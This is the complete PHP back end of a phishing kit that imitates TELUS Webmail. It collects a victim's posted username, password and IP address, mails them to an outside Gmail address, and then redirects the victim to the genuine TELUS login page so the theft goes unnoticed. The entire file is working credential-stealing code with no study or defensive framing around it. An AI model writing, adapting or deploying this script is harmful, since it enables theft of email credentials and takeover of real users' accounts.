<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------TELUS Webmail----------------------\n";
$message .= "?????: ".$_POST['username']."\n";
$message .= "? ?: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Cla---------------------\n";
$recipient = "clarksteven844@gmail.com";
$subject = "telus.com mail";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Texlon-Version: 1.0\n";
	 mail("", "Texlon$", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://webmail.telus.net/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>

